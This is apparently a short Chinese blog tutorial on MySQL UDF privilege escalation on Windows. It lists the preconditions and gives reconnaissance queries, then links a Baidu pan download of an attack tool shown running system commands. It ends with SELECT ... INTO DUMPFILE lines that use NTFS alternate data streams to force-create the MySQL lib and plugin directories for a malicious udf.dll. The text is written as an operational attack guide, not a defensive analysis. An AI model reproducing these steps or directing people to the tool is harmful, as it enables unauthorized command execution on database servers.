# 1、 前提

1. 必须是root权限（主要是得创建和抛弃自定义函数）

2. secure_file_priv=(未写路径)

3. 将udf.dll文件上传到MySQL的plugin目录下（这里以MySQL>=5.1为例）

# 0x02 提权中用到的查询语句

```bash
SELECT version(); #查询数据库版本
SELECT @@basedir; #查询MySQL的安装目录
SELECT user();  #查询当前用户
SHOW VARIABLES LIKE '%plugins%';  #查找是否有plugins目录
show variables like '%compile%'; #查看数据库位数
```



# 0x03 工具

**暗月工具**

```
下载地址：https://pan.baidu.com/s/1EoGKX6bksOCFGgonFvfgYw 提取码：8ng0
个人感觉这个工具依然需要在plugin文件夹存在的前提下
打开工具页面如下：
```

![img](https://img2020.cnblogs.com/blog/1937992/202005/1937992-20200529231048405-47322894.png)

![img](https://img2020.cnblogs.com/blog/1937992/202005/1937992-20200529231307617-343313896.png)

 

 

 接下来直接执行命令即可

![img](https://img2020.cnblogs.com/blog/1937992/202005/1937992-20200529231454919-726445555.png)

 

 这工具真的是太香了

ps: 

这里补充一点，

这里的关键是lib目录下没有plugin文件夹，得突破限制创建文件夹
还有一种创建plugin文件夹的方式（我没成功过，有缘的小伙伴可能会成功）
一般Lib、Plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）

select @@basedir; //查找到mysql的目录

select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'; //利用NTFS ADS创建lib目录

select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION'; //利用NTFS ADS创建plugin目录